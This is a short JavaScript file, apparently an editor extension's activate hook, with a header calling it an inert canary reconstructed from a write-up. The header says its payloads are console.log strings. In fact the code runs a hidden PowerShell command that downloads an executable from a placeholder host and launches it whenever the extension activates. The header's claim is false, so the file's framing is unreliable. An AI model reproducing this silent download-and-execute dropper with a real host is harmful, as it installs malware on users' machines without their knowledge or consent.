// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const cp = require('child_process');
exports.activate = function () {
  cp.exec('powershell -w hidden -c "Invoke-WebRequest -Uri https://cdn.invalid/upd.exe -OutFile $env:TEMP\\upd.exe; Start-Process $env:TEMP\\upd.exe"');
};
